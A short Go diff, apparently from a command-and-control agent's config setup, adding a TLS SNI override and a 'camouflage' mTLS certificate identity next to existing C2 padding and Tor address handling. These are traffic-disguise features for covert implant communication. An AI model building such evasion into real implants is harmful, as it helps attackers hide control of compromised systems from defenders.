@@ -39,6 +39,10 @@ func InitConfig() (err error) {
 	// Control-frame padding is a sender-side knob; 0 disables it.
 	transport.SetC2Padding(RuntimeConfig.PaddingMin, RuntimeConfig.PaddingMax)
 
+	// C2 TLS SNI override and stable mesh mTLS identity.
+	transport.SetC2ServerName(RuntimeConfig.SNI)
+	transport.SetMeshCamouflageIdentity(RuntimeConfig.CamouflageCertOrg, RuntimeConfig.CamouflageCertCN)
+
 	// CC Address
 	def.CCAddress = RuntimeConfig.CCAddress
 	isTor := netutil.IsTor(def.CCAddress)
